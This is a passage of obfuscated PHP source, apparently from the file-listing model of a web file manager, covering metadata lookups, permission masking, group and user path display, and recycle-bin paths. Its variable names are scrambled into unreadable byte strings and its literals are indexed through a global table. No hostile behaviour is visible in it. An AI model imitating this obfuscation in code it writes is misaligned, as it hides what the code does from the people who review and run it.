$ñƒ»¹­Ê[440] . $Ó¨³…ïÚ[$ñƒ»¹­Ê[183]]] = $Ó¨³…ïÚ; } unset($Ó¨³…ïÚ); } protected function _listMake(&$©¨¿§æ) { $ŠÊä·¥ê =& $_SERVER[ú‡®¯¨±]; $©¨¿§æ[$ŠÊä·¥ê[84]] = array(); $©¨¿§æ[$ŠÊä·¥ê[85]] = array(); foreach ($©¨¿§æ[$ŠÊä·¥ê[424]] as $‘ŞĞ²¸Ç) { $Ä£°ÕŠè = $‘ŞĞ²¸Ç[$ŠÊä·¥ê[463]] == 1 ? $ŠÊä·¥ê[84] : $ŠÊä·¥ê[85]; $©¨¿§æ[$Ä£°ÕŠè][] = $‘ŞĞ²¸Ç; } unset($©¨¿§æ[$ŠÊä·¥ê[424]]); } protected function _listAppendMeta(&$ì¬¨«â„, $«çúÖø) { $÷‹·Š =& $_SERVER[ú‡®¯¨±]; $Éæãæ‚Ì = array($÷‹·Š[469] => array($÷‹·Š[470], $«çúÖø)); $…µÖÁÒ” = Model($÷‹·Š[513])->field($÷‹·Š[514])->where($Éæãæ‚Ì)->select(); if (!$…µÖÁÒ”) { return; } $ÛÁ©İ¥À = array($÷‹·Š[515], $÷‹·Š[516], $÷‹·Š[495]); $„¨áÊ = array(); foreach ($…µÖÁÒ” as $­şÌâæÆ) { if (!isset($„¨áÊ[$­şÌâæÆ[$÷‹·Š[183]]])) { $„¨áÊ[$­şÌâæÆ[$÷‹·Š[183]]] = array(); } if (in_array($­şÌâæÆ[$÷‹·Š[96]], $ÛÁ©İ¥À)) { continue; } $„¨áÊ[$­şÌâæÆ[$÷‹·Š[183]]][$­şÌâæÆ[$÷‹·Š[96]]] = $­şÌâæÆ[$÷‹·Š[429]]; } foreach ($ì¬¨«â„ as &$£ÑÜÂ“Ø) { $£ÑÜÂ“Ø[$÷‹·Š[517]] = !1; if (isset($„¨áÊ[$£ÑÜÂ“Ø[$÷‹·Š[183]]])) { $£ÑÜÂ“Ø[$÷‹·Š[517]] = $„¨áÊ[$£ÑÜÂ“Ø[$÷‹·Š[183]]]; } if ($this->fileIsLock($£ÑÜÂ“Ø) && $£ÑÜÂ“Ø[$÷‹·Š[465]]) { $Ë®¿‹½Ò = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $£ÑÜÂ“Ø[$÷‹·Š[465]][$÷‹·Š[466]] = AuthModel::authDisable($£ÑÜÂ“Ø[$÷‹·Š[465]][$÷‹·Š[466]], $Ë®¿‹½Ò); $£ÑÜÂ“Ø[$÷‹·Š[465]][$÷‹·Š[518]][$÷‹·Š[465]] = $£ÑÜÂ“Ø[$÷‹·Š[465]][$÷‹·Š[466]]; } } unset($£ÑÜÂ“Ø); } protected function _listAppendFileMeta(&$ì®•Ì¸¨, $¤Åõº³ô) { $£‚âºÀâ =& $_SERVER[ú‡®¯¨±]; $„š¢Ùš = array_to_keyvalue($ì®•Ì¸¨, $£‚âºÀâ[12], $£‚âºÀâ[519]); $„š¢Ùš = array_filter(array_unique($„š¢Ùš)); if (!$„š¢Ùš) { return; } $ë­šôÒ = array($£‚âºÀâ[520] => array($£‚âºÀâ[470], $„š¢Ùš)); $àŠ®Ëë§ = $£‚âºÀâ[521]; $¤íÓçÏ = Model($£‚âºÀâ[522])->field($àŠ®Ëë§)->where($ë­šôÒ)->select(); $¤íÓçÏ = array_to_keyvalue($¤íÓçÏ, $£‚âºÀâ[519]); $±’‚ú³ = Model($£‚âºÀâ[523])->field($£‚âºÀâ[524])->where($ë­šôÒ)->select(); $±’‚ú³ = $±’‚ú³ ? $±’‚ú³ : array(); $³Îô÷é = array(); foreach ($±’‚ú³ as $½ï»Á) { if (!isset($³Îô÷é[$½ï»Á[$£‚âºÀâ[519]]])) { $³Îô÷é[$½ï»Á[$£‚âºÀâ[519]]] = array(); } $³Îô÷é[$½ï»Á[$£‚âºÀâ[519]]][$½ï»Á[$£‚âºÀâ[96]]] = $½ï»Á[$£‚âºÀâ[429]]; } foreach ($ì®•Ì¸¨ as &$»¹ÍÚö·) { $‚š™¡Òò = $»¹ÍÚö·[$£‚âºÀâ[519]]; if (!$‚š™¡Òò || !is_array($¤íÓçÏ[$‚š™¡Òò])) { continue; } $ÙóÆ°ö = $¤íÓçÏ[$‚š™¡Òò]; $ÙóÆ°ö[$£‚âºÀâ[78]] = $»¹ÍÚö·[$£‚âºÀâ[78]]; $ÙóÆ°ö[$£‚âºÀâ[32]] = $»¹ÍÚö·[$£‚âºÀâ[32]]; if (!$ÙóÆ°ö[$£‚âºÀâ[525]]) { Model($£‚âºÀâ[522])->fileMd5Check($ÙóÆ°ö); } if (!isset(self::$cacheFileInfo[$£‚âºÀâ[526] . $‚š™¡Òò])) { self::$cacheFileInfo[$£‚âºÀâ[526] . $‚š™¡Òò] = array_merge(array(), $ÙóÆ°ö); } unset($¤íÓçÏ[$‚š™¡Òò][$£‚âºÀâ[86]]); $ÌÌ¹òÇ© = is_array($³Îô÷é[$‚š™¡Òò]) ? $³Îô÷é[$‚š™¡Òò] : array(); $»¹ÍÚö·[$£‚âºÀâ[527]] = array_merge($ÌÌ¹òÇ©, $¤íÓçÏ[$‚š™¡Òò]); if (isset($»¹ÍÚö·[$£‚âºÀâ[527]][$£‚âºÀâ[173]])) { $»¹ÍÚö·[$£‚âºÀâ[173]] = json_decode($»¹ÍÚö·[$£‚âºÀâ[527]][$£‚âºÀâ[173]], !0); unset($»¹ÍÚö·[$£‚âºÀâ[527]][$£‚âºÀâ[173]]); } } unset($»¹ÍÚö·); } protected function _listAppendSourceInfo(&$ù•Ò’ŠÆ, $ƒ°®í™») { $ËÇ‚è¼Ë =& $_SERVER[ú‡®¯¨±]; $¤°¿Æå = Model($ËÇ‚è¼Ë[528])->listData(); $ˆË‚”“Æ = Model($ËÇ‚è¼Ë[477])->listData(); $à´ıÂ¦² = Model($ËÇ‚è¼Ë[467])->listData(); $ğùâò»é = Model($ËÇ‚è¼Ë[529])->listSimple(); $Á“šèÉã = array_to_keyvalue($¤°¿Æå, $ËÇ‚è¼Ë[453]); $ìÚ‚Œ°¹ = array_to_keyvalue_group($ˆË‚”“Æ, $ËÇ‚è¼Ë[86], $ËÇ‚è¼Ë[478]); $á™ºƒÄŠ = array_to_keyvalue($à´ıÂ¦², $ËÇ‚è¼Ë[86]); $Ê§‡Ÿñ  = array_to_keyvalue_group($ğùâò»é, $ËÇ‚è¼Ë[183]); foreach ($ù•Ò’ŠÆ as &$”¡åêŞ) { $”¡åêŞ[$ËÇ‚è¼Ë[89]] = array($ËÇ‚è¼Ë[530] => 0, $ËÇ‚è¼Ë[531] => 0, $ËÇ‚è¼Ë[532] => 0); if (isset($á™ºƒÄŠ[$”¡åêŞ[$ËÇ‚è¼Ë[183]]])) { $”¡åêŞ[$ËÇ‚è¼Ë[89]][$ËÇ‚è¼Ë[533]] = 1; $”¡åêŞ[$ËÇ‚è¼Ë[89]][$ËÇ‚è¼Ë[534]] = $á™ºƒÄŠ[$”¡åêŞ[$ËÇ‚è¼Ë[183]]][$ËÇ‚è¼Ë[32]]; } if ($ìÚ‚Œ°¹ && $Á“šèÉã && isset($ìÚ‚Œ°¹[$”¡åêŞ[$ËÇ‚è¼Ë[183]]])) { $”¡åêŞ[$ËÇ‚è¼Ë[89]][$ËÇ‚è¼Ë[535]] = array(); foreach ($ìÚ‚Œ°¹[$”¡åêŞ[$ËÇ‚è¼Ë[183]]] as $çåî¨„) { $¯Ã¾³ÓÎ = $Á“šèÉã[$çåî¨„]; $”¡åêŞ[$ËÇ‚è¼Ë[89]][$ËÇ‚è¼Ë[535]][] = array($ËÇ‚è¼Ë[536] => $¯Ã¾³ÓÎ[$ËÇ‚è¼Ë[453]], $ËÇ‚è¼Ë[472] => $¯Ã¾³ÓÎ[$ËÇ‚è¼Ë[32]], $ËÇ‚è¼Ë[537] => $¯Ã¾³ÓÎ[$ËÇ‚è¼Ë[538]]); } } if ($Ê§‡Ÿñ  && isset($Ê§‡Ÿñ [$”¡åêŞ[$ËÇ‚è¼Ë[183]]])) { $”¡åêŞ[$ËÇ‚è¼Ë[89]][$ËÇ‚è¼Ë[539]] = array(); foreach ($Ê§‡Ÿñ [$”¡åêŞ[$ËÇ‚è¼Ë[183]]] as $¤õˆ¯¯²) { $ÄÓÊ˜½Ê = $ËÇ‚è¼Ë[540]; if ($¤õˆ¯¯²[$ËÇ‚è¼Ë[541]] == $ËÇ‚è¼Ë[90]) { $ÄÓÊ˜½Ê .= $ËÇ‚è¼Ë[542]; } $”¡åêŞ[$ËÇ‚è¼Ë[89]][$ËÇ‚è¼Ë[539]] = array_field_key($¤õˆ¯¯², explode($ËÇ‚è¼Ë[50], $ÄÓÊ˜½Ê)); } } } unset($”¡åêŞ); return $ù•Ò’ŠÆ; } protected function _listAppendChildren(&$Ô’¶¥œÙ, $¡šİ‚¿) { $³óÎ« =& $_SERVER[ú‡®¯¨±]; $Ì›±Ãˆ… = array(); $Ì³ûâ° = array($³óÎ«[235] => 0, $³óÎ«[236] => 0); foreach ($Ô’¶¥œÙ as &$¿é§¦ƒË) { if (!$¿é§¦ƒË[$³óÎ«[463]]) { continue; } $Ì›±Ãˆ…[] = $¿é§¦ƒË[$³óÎ«[183]]; } unset($¿é§¦ƒË); if (!$Ì›±Ãˆ…) { return; } $ÃŞıËÁş = array($³óÎ«[182] => array($³óÎ«[7], $Ì›±Ãˆ…), $³óÎ«[483] => 0); $äòÁŒË = array($³óÎ«[182], $³óÎ«[463], $³óÎ«[543] => $³óÎ«[544]); $ƒ´¶İÁ‡ = $this->field($äòÁŒË)->where($ÃŞıËÁş)->group($³óÎ«[545])->select(); $¡Ê¶ÈØ = array(); foreach ($ƒ´¶İÁ‡ as $ÂŠ´„­Â) { $Ğ ñ»Ÿ¹ = $ÂŠ´„­Â[$³óÎ«[182]]; $Ë¬½ÂÒê = $ÂŠ´„­Â[$³óÎ«[463]] == $³óÎ«[90] ? $³óÎ«[236] : $³óÎ«[235]; if (!isset($¡Ê¶ÈØ[$Ğ ñ»Ÿ¹])) { $¡Ê¶ÈØ[$Ğ ñ»Ÿ¹] = array($³óÎ«[235] => 0, $³óÎ«[236] => 0); } $¡Ê¶ÈØ[$Ğ ñ»Ÿ¹][$Ë¬½ÂÒê] += $ÂŠ´„­Â[$³óÎ«[544]]; } foreach ($Ô’¶¥œÙ as &$¿é§¦ƒË) { if (!$¿é§¦ƒË[$³óÎ«[463]]) { continue; } $¾Ù¦¢á = is_array($¡Ê¶ÈØ[$¿é§¦ƒË[$³óÎ«[183]]]) ? $¡Ê¶ÈØ[$¿é§¦ƒË[$³óÎ«[183]]] : $Ì³ûâ°; $¿é§¦ƒË[$³óÎ«[236]] = $¾Ù¦¢á[$³óÎ«[236]]; $¿é§¦ƒË[$³óÎ«[235]] = $¾Ù¦¢á[$³óÎ«[235]]; unset($¿é§¦ƒË[$³óÎ«[464]]); } unset($¿é§¦ƒË); } protected function _listAppendAuth(&$„¶î÷ƒÉ) { $•ÜÍ©ı£ =& $_SERVER[ú‡®¯¨±]; $É…•‚¦§ = array(); foreach ($„¶î÷ƒÉ as $‹Ç—Í‘İ) { if ($‹Ç—Í‘İ[$•ÜÍ©ı£[180]] == self::TYPE_GROUP) { $É…•‚¦§[] = $‹Ç—Í‘İ[$•ÜÍ©ı£[183]]; } } if (!$É…•‚¦§) { return; } $Æı¨Å¾› = array_to_keyvalue($„¶î÷ƒÉ, $•ÜÍ©ı£[183]); $×ÁöõØî = Model($•ÜÍ©ı£[546])->getSourceList($É…•‚¦§, $Æı¨Å¾›); $¬¤œ„Ó = KodUser::isRoot(); foreach ($„¶î÷ƒÉ as $ÉíÙãß => &$‹Ç—Í‘İ) { $‹Ç—Í‘İ[$•ÜÍ©ı£[465]] = $×ÁöõØî[$‹Ç—Í‘İ[$•ÜÍ©ı£[183]]]; if (!$‹Ç—Í‘İ[$•ÜÍ©ı£[465]] && $‹Ç—Í‘İ[$•ÜÍ©ı£[180]] == self::TYPE_GROUP) { $‹Ç—Í‘İ[$•ÜÍ©ı£[465]] = Action($•ÜÍ©ı£[547])->pathGroupAuthMake($‹Ç—Í‘İ[$•ÜÍ©ı£[548]]); if (!$‹Ç—Í‘İ[$•ÜÍ©ı£[465]] && !$¬¤œ„Ó) { $‹Ç—Í‘İ[$•ÜÍ©ı£[229]] = !1; $‹Ç—Í‘İ[$•ÜÍ©ı£[228]] = !1; } } if ($‹Ç—Í‘İ[$•ÜÍ©ı£[465]]) { $‹Ç—Í‘İ[$•ÜÍ©ı£[229]] = AuthModel::authCheckEdit($‹Ç—Í‘İ[$•ÜÍ©ı£[465]][$•ÜÍ©ı£[466]]); $‹Ç—Í‘İ[$•ÜÍ©ı£[228]] = AuthModel::authCheckView($‹Ç—Í‘İ[$•ÜÍ©ı£[465]][$•ÜÍ©ı£[466]]); } $this->groupPathDisplay($‹Ç—Í‘İ); } unset($‹Ç—Í‘İ); } public function _listAppendAuthSecret(&$ßÅÍ©“İ) { $í¢»•Ü‡ =& $_SERVER[ú‡®¯¨±]; if (Model($í¢»•Ü‡[486])->get($í¢»•Ü‡[549]) != $í¢»•Ü‡[90]) { return; } static $·æ•Ã = false; if (!$·æ•Ã) { $øÚÌ…Ä = Model($í¢»•Ü‡[550]); $û›ş = Model($í¢»•Ü‡[551]); $·æ•Ã = $û›ş->listData(); $·æ•Ã = array_to_keyvalue($·æ•Ã, $í¢»•Ü‡[183]); $º‚É´ãè = json_decode(Model($í¢»•Ü‡[486])->get($í¢»•Ü‡[552]), !0); $º‚É´ãè = array_to_keyvalue($º‚É´ãè, $í¢»•Ü‡[453]); foreach ($·æ•Ã as $¼øü¡ùÏ => $´²‘·õ‰) { $‘´ã‘ = $º‚É´ãè[$´²‘·õ‰[$í¢»•Ü‡[553]]]; if (!$‘´ã‘) { $û›ş->remove($´²‘·õ‰[$í¢»•Ü‡[453]]); unset($·æ•Ã[$¼øü¡ùÏ]); continue; } $á…éÜÌ = $øÚÌ…Ä->listData($‘´ã‘[$í¢»•Ü‡[465]]); if (!$á…éÜÌ) { $û›ş->remove($´²‘·õ‰[$í¢»•Ü‡[453]]); unset($·æ•Ã[$¼øü¡ùÏ]); continue; } $´²‘·õ‰[$í¢»•Ü‡[465]] = $á…éÜÌ; $´²‘·õ‰[$í¢»•Ü‡[554]] = $‘´ã‘; $´²‘·õ‰[$í¢»•Ü‡[555]] = Model($í¢»•Ü‡[556])->getInfoSimpleOuter($´²‘·õ‰[$í¢»•Ü‡[505]]); $·æ•Ã[$¼øü¡ùÏ] = $´²‘·õ‰; } } $ùÈ­üéú = USER_ID; $Ñ¨øúÙä = array(); $®äÇöÆç = $this->_listAppendPath($Ñ¨øúÙä, !0); foreach ($ßÅÍ©“İ as $¼øü¡ùÏ => &$´²‘·õ‰) { if (!is_array($´²‘·õ‰[$í¢»•Ü‡[465]])) { continue; } if ($´²‘·õ‰[$í¢»•Ü‡[180]] != $í¢»•Ü‡[557]) { continue; } if (isset($·æ•Ã[$´²‘·õ‰[$í¢»•Ü‡[183]]])) { $¯Á–×¯ = $·æ•Ã[$´²‘·õ‰[$í¢»•Ü‡[183]]]; if (!is_array($´²‘·õ‰[$í¢»•Ü‡[517]])) { $´²‘·õ‰[$í¢»•Ü‡[517]] = array(); } $´²‘·õ‰[$í¢»•Ü‡[517]][$í¢»•Ü‡[558]] = $¯Á–×¯[$í¢»•Ü‡[553]]; $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[559]] = $¯Á–×¯; $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[560]] = $´²‘·õ‰[$í¢»•Ü‡[561]]; $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[562]] = $í¢»•Ü‡[90]; if ($¯Á–×¯[$í¢»•Ü‡[505]] != $ùÈ­üéú) { $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[466]] = $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[466]] & $¯Á–×¯[$í¢»•Ü‡[465]][$í¢»•Ü‡[465]]; } continue; } $ êÀ¤ = $this->parentLevelArray($´²‘·õ‰[$í¢»•Ü‡[563]]); $àŒŠº©¶ = array_reverse($ êÀ¤); foreach ($àŒŠº©¶ as $ß•×å›à => $÷…ó¿”Æ) { if (!isset($·æ•Ã[$÷…ó¿”Æ])) { continue; } $¯Á–×¯ = $·æ•Ã[$÷…ó¿”Æ]; $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[559]] = $¯Á–×¯; if ($¯Á–×¯[$í¢»•Ü‡[505]] != $ùÈ­üéú) { $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[466]] = $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[466]] & $¯Á–×¯[$í¢»•Ü‡[465]][$í¢»•Ü‡[465]]; } $ß•›¡ö© = $í¢»•Ü‡[12]; $î¢ÚÎœñ = count($ êÀ¤) - $ß•×å›à; for ($º¢­æÀ = 0; $º¢­æÀ < $î¢ÚÎœñ; $º¢­æÀ++) { if (!isset($®äÇöÆç[$ êÀ¤[$º¢­æÀ]])) { $ß•›¡ö© = $í¢»•Ü‡[12]; break; } $ß•›¡ö© = $ß•›¡ö© . rtrim($®äÇöÆç[$ êÀ¤[$º¢­æÀ]], $í¢»•Ü‡[8]) . $í¢»•Ü‡[8]; } $´²‘·õ‰[$í¢»•Ü‡[465]][$í¢»•Ü‡[560]] = rtrim($ß•›¡ö©, $í¢»•Ü‡[8]) . $í¢»•Ü‡[8]; break; } } unset($´²‘·õ‰); } public function groupPathDisplay(&$„Šˆ©») { $¤Ø¤ÏËß =& $_SERVER[ú‡®¯¨±]; if ($„Šˆ©»[$¤Ø¤ÏËß[180]] != self::TYPE_GROUP) { return; } $âúÂƒÜ… = Model($¤Ø¤ÏËß[564])->getInfo($„Šˆ©»[$¤Ø¤ÏËß[548]]); $üé©æÖ­ = $this->parentLevelArray($âúÂƒÜ…[$¤Ø¤ÏËß[563]]); $Ô¬ù  = $¤Ø¤ÏËß[12]; foreach ($üé©æÖ­ as $Ş¤øµËû) { $²€Ó¯ş­ = Model($¤Ø¤ÏËß[564])->getInfo($Ş¤øµËû); $Ô¬ù  .= $²€Ó¯ş­[$¤Ø¤ÏËß[89]][$¤Ø¤ÏËß[183]] . $¤Ø¤ÏËß[50]; } $„Šˆ©»[$¤Ø¤ÏËß[565]] = $âúÂƒÜ…[$¤Ø¤ÏËß[182]]; $„Šˆ©»[$¤Ø¤ÏËß[566]] = $âúÂƒÜ…[$¤Ø¤ÏËß[563]]; $„Šˆ©»[$¤Ø¤ÏËß[567]] = $âúÂƒÜ…[$¤Ø¤ÏËß[568]]; $„Šˆ©»[$¤Ø¤ÏËß[569]] = $Ô¬ù  . $âúÂƒÜ…[$¤Ø¤ÏËß[89]][$¤Ø¤ÏËß[183]]; } protected function _listAppendPath(&$ù†À‘°, $Éª¯Õü½ = false) { $ãªäİÍú =& $_SERVER[ú‡®¯¨±]; static $Ñ••áèã = array(); $ƒÊïòÂŸ = array(); $ ²È½¬ = array(); if ($Éª¯Õü½) { return $Ñ••áèã; } foreach ($ù†À‘° as &$ •«ñà£) { $¹ˆÎÑ™€ = $ •«ñà£[$ãªäİÍú[183]]; if ($ •«ñà£[$ãªäİÍú[463]] == $ãªäİÍú[90] && $ •«ñà£[$ãªäİÍú[182]] != 0) { $Ñ••áèã[$¹ˆÎÑ™€] = $ •«ñà£[$ãªäİÍú[32]]; } if ($ •«ñà£[$ãªäİÍú[463]] == $ãªäİÍú[90] && $ •«ñà£[$ãªäİÍú[182]] == 0) { $Ñ••áèã[$¹ˆÎÑ™€] = $this->_listAppendPathRoot($ •«ñà£, array()); } if (isset($ ²È½¬[$ •«ñà£[$ãªäİÍú[563]]])) { continue; } $ ²È½¬[$ •«ñà£[$ãªäİÍú[563]]] = !0; $æî£­²µ = $this->parentLevelArray($ •«ñà£[$ãªäİÍú[563]]); foreach ($æî£­²µ as $¤€åª‹‘ => $ñÌÊÏ’ ) { if (isset($Ñ••áèã[$ñÌÊÏ’ ])) { continue; } if ($¤€åª‹‘ == 0) { $Ñ••áèã[$ñÌÊÏ’ ] = $this->_listAppendPathRoot($ •«ñà£, $æî£­²µ); } if ($¤€åª‹‘ != 0) { $ƒÊïòÂŸ[] = $ñÌÊÏ’ ; } } } unset($ •«ñà£); $ƒÊïòÂŸ = array_unique($ƒÊïòÂŸ); if (count($ƒÊïòÂŸ) > 0) { $¨¯Öñú» = array($ãªäİÍú[469] => array($ãªäİÍú[470], $ƒÊïòÂŸ)); if (count($ƒÊïòÂŸ) == 1) { $Óœ¢½åß = $this->sourceInfo($ƒÊïòÂŸ[0]); $¼ÃšÑ¢¥ = is_array($Óœ¢½åß) ? array($Óœ¢½åß) : !1; } else { $¼ÃšÑ¢¥ = $this->field($ãªäİÍú[570])->where($¨¯Öñú»)->select(); } if (!$¼ÃšÑ¢¥) { $¼ÃšÑ¢¥ = array(); } foreach ($¼ÃšÑ¢¥ as $¥Š˜´…×) { $Ñ••áèã[$¥Š˜´…×[$ãªäİÍú[183]]] = $¥Š˜´…×[$ãªäİÍú[32]]; } } $§İı¹„ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Í”¾¯¬ã = array(); foreach ($ù†À‘° as &$ •«ñà£) { $±ë÷¢Õ = $ •«ñà£[$ãªäİÍú[563]]; $¥ÃİªÊé = $ãªäİÍú[12]; if (isset($Í”¾¯¬ã[$±ë÷¢Õ])) { $¥ÃİªÊé = $Í”¾¯¬ã[$±ë÷¢Õ]; } else { $æî£­²µ = $this->parentLevelArray($ •«ñà£[$ãªäİÍú[563]]); foreach ($æî£­²µ as $¤€åª‹‘ => $ñÌÊÏ’ ) { if (isset($Ñ••áèã[$ñÌÊÏ’ ])) { $¥ÃİªÊé .= $Ñ••áèã[$ñÌÊÏ’ ] . $ãªäİÍú[8]; } } $Í”¾¯¬ã[$±ë÷¢Õ] = $¥ÃİªÊé; } $¥ÃİªÊé .= $ •«ñà£[$ãªäİÍú[32]]; if ($ •«ñà£[$ãªäİÍú[463]] == $ãªäİÍú[90]) { $¥ÃİªÊé .= $ãªäİÍú[8]; } $ •«ñà£[$ãªäİÍú[561]] = str_replace($ãªäİÍú[571], $ãªäİÍú[8], $¥ÃİªÊé); if ($ •«ñà£[$ãªäİÍú[182]] == $ãªäİÍú[224]) { $ •«ñà£[$ãªäİÍú[32]] = trim($Ñ••áèã[$ •«ñà£[$ãªäİÍú[183]]], $ãªäİÍú[8]); $ •«ñà£[$ãªäİÍú[561]] = $ •«ñà£[$ãªäİÍú[32]] . $ãªäİÍú[8]; } if (intval($ •«ñà£[$ãªäİÍú[180]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ •«ñà£, $æî£­²µ, $§İı¹„); } } unset($ •«ñà£); return $ù†À‘°; } private function _listAppendPathRecycle(&$¾’™³…œ, $ÖÏ¹÷·, $›İÁ©¬„) { $€”†›Èó =& $_SERVER[ú‡®¯¨±]; if (!in_array($›İÁ©¬„, $ÖÏ¹÷·) && $¾’™³…œ[$€”†›Èó[183]] != $›İÁ©¬„) { return; } $ˆá—ÕÄ” = explode($€”†›Èó[8], trim($¾’™³…œ[$€”†›Èó[561]], $€”†›Èó[8])); $Ñ‘Ã·¡à = implode($€”†›Èó[8], array_slice($ˆá—ÕÄ”, 2)); $¾’™³…œ[$€”†›Èó[561]] = $€”†›Èó[8] . LNG($€”†›Èó[572]) . $€”†›Èó[8] . ltrim($Ñ‘Ã·¡à, $€”†›Èó[8]); $¾’™³…œ[$€”†›Èó[563]] = $€”†›Èó[573] . implode($€”†›Èó[50], array_slice($ÖÏ¹÷·, 1)) . $€”†›Èó[50]; if ($¾’™³…œ[$€”†›Èó[183]] == $›İÁ©¬„) { $¾’™³…œ[$€”†›Èó[563]] = $€”†›Èó[573]; $¾’™³…œ[$€”†›Èó[182]] = $€”†›Èó[224]; $¾’™³…œ[$€”†›Èó[32]] = LNG($€”†›Èó[572]); } $¾’™³…œ[$€”†›Èó[574]] = $€”†›Èó[575]; } protected function _listAppendPathRoot(&$ƒ…ü‚Ø×, $‚©Ï—) { $§›å¦°ª =& $_SERVER[ú‡®¯¨±]; static $ü„‘øË = false; $çîÚåëË = $§›å¦°ª[12]; if ($ƒ…ü‚Ø×[$§›å¦°ª[180]] == self::TYPE_USER) { if ($ƒ…ü‚Ø×[$§›å¦°ª[548]] == USER_ID) { $çîÚåëË = LNG($§›å¦°ª[576]); if ($ü„‘øË === !1) { $ËìµéÎ’ = Model($§›å¦°ª[577])->getInfoFull(USER_ID); $ü„‘øË = _get($ËìµéÎ’, $§›å¦°ª[578], $§›å¦°ª[12]); } if ($‚©Ï— && $‚©Ï—[0] == $ü„‘øË || !$‚©Ï— && $ƒ…ü‚Ø×[$§›å¦°ª[183]] == $ü„‘øË) { $çîÚåëË = LNG($§›å¦°ª[579]); $ƒ…ü‚Ø×[$§›å¦°ª[580]] = $§›å¦°ª[581]; } if (!$‚©Ï—) { $ƒ…ü‚Ø×[$§›å¦°ª[32]] = $çîÚåëË; } } else { $ƒ…ü‚Ø×[$§›å¦°ª[582]] = Model($§›å¦°ª[556])->getInfoSimpleOuter($ƒ…ü‚Ø×[$§›å¦°ª[548]]); $çîÚåëË = LNG($§›å¦°ª[583]) . $§›å¦°ª[165] . $ƒ…ü‚Ø×[$§›å¦°ª[582]][$§›å¦°ª[32]] . $§›å¦°ª[167]; } } else { if ($ƒ…ü‚Ø×[$§›å¦°ª[180]] == self::TYPE_GROUP) { $‡æöªÊÇ = Model($§›å¦°ª[564])->getInfoSimple($ƒ…ü‚Ø×[$§›å¦°ª[548]]); $çîÚåëË = $‡æöªÊÇ[$§›å¦°ª[32]]; } else { if ($ƒ…ü‚Ø×[$§›å¦°ª[180]] == self::TYPE_SYSTEM) { $çîÚåëË = $§›å¦°ª[584]; } } } $çîÚåëË = $çîÚåëË ? $§›å¦°ª[8] . $çîÚåëË . $§›å¦°ª[8] : $§›å¦°ª[8]; return $çîÚåëË; } protected function _listAppendUser(&$Åõ¢ Ä×) { $µÇïòÑ =& $_SERVER[ú‡®¯¨±]; $­ÛÕ¡ÉŠ = array_to_keyvalue($Åõ¢ Ä×, $µÇïòÑ[12], $µÇïòÑ[505]); $—õ´ËœÑ = array_to_keyvalue($Åõ¢ Ä×, $µÇïòÑ[12], $µÇïòÑ[507]); $¥³¢ù²ë = array_merge($­ÛÕ¡ÉŠ, $—õ´ËœÑ); $à½íˆÄÀ = Model($µÇïòÑ[577])->userListInfo($¥³¢ù²ë); foreach ($Åõ¢ Ä× as &$ÑÃ„Šñª) { $ÔĞÜçˆ™ = $ÑÃ„Šñª[$µÇïòÑ[505]]; $ÑÃ„Šñª[$µÇïòÑ[505]] = $à½íˆÄÀ[$ÔĞÜçˆ™] ? $à½íˆÄÀ[$ÔĞÜçˆ™] : !1; $ÔĞÜçˆ™ = $ÑÃ„Šñª[$µÇïòÑ[507]]; $ÑÃ„Šñª[$µÇïòÑ[507]] = $à½íˆÄÀ[$ÔĞÜçˆ™] ? $à½íˆÄÀ[$ÔĞÜçˆ™] : !1; if (isset($ÑÃ„Šñª[$µÇïòÑ[517]]) && $ÑÃ„Šñª[$µÇïòÑ[517]][$µÇïòÑ[585]]) { $‰³â¡‘Š = $GLOBALS[$µÇïòÑ[6]][$µÇïòÑ[91]][$µÇïòÑ[586]]; if ($ÑÃ„Šñª[$µÇïòÑ[517]][$µÇïòÑ[587]] <= time() - $‰³â¡‘Š) { $this->metaSet($ÑÃ„Šñª[$µÇïòÑ[183]], $µÇïòÑ[585], null); $this->metaSet($ÑÃ„Šñª[$µÇïòÑ[183]], $µÇïòÑ[587], null); unset($ÑÃ„Šñª[$µÇïòÑ[517]][$µÇïòÑ[585]]); continue; } $ï˜Ÿ²¸û = $ÑÃ„Šñª[$µÇïòÑ[517]][$µÇïòÑ[585]]; $ÑÃ„Šñª[$µÇïòÑ[517]][$µÇïòÑ[588]] = Model($µÇïòÑ[577])->getInfoSimpleOuter($ï˜Ÿ²¸û); } } unset($ÑÃ„Šñª); } public function parentLevelArray($¯Ë›“«³) { $Õà¾‰µ½ =& $_SERVER[ú‡®¯¨±]; $¯Ë›“«³ = explode($Õà¾‰µ½[50], trim($¯Ë›“«³, $Õà¾‰µ½[50])); return array_remove_value($¯Ë›“«³, $Õà¾‰µ½[224]); } public function listAll($ªüĞÙØ¨) { $†ÃŠœ„ =& $_SERVER[ú‡®¯¨±]; $Ô•ÏÅÂÛ = $this->sourceInfo($ªüĞÙØ¨); $çÔÕ™çÓ = array($†ÃŠœ„[589] => array($†ÃŠœ„[590], $Ô•ÏÅÂÛ[$†ÃŠœ„[563]] . $ªüĞÙØ¨ . $†ÃŠœ„[591]), $†ÃŠœ„[592] => 0); $öæ–„èÍ = $†ÃŠœ„[593]; $âóµñ = "\x4c\105\106\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\x69\157\137\x66\x69\x6c\x65\x20\146\151\154\x65\x20\157\x6e\40\163\157\x75\162\143\x65\56\146\x69\x6c\x65\111\x44\40\x3d\40\146\x69\154\x65\x2e\146\x69\x6c\145\111\104"; $ºò‡ß   = $this->alias($†ÃŠœ„[497])->field($öæ–„èÍ)->where($çÔÕ™çÓ)->join($âóµñ)->select(); $this->_listAppendAuth($ºò‡ß  ); $this->_listAppendUser($ºò‡ß  ); $this->_listAppendPath($ºò‡ß  ); $ºò‡ß   = array_to_keyvalue($ºò‡ß  , $†ÃŠœ„[183]); $¯ş°±äæ = "\x2f{$Ô•ÏÅÂÛ[$†ÃŠœ„[32]]}\57"; $¯ş°±äæ = $¯ş°±äæ == 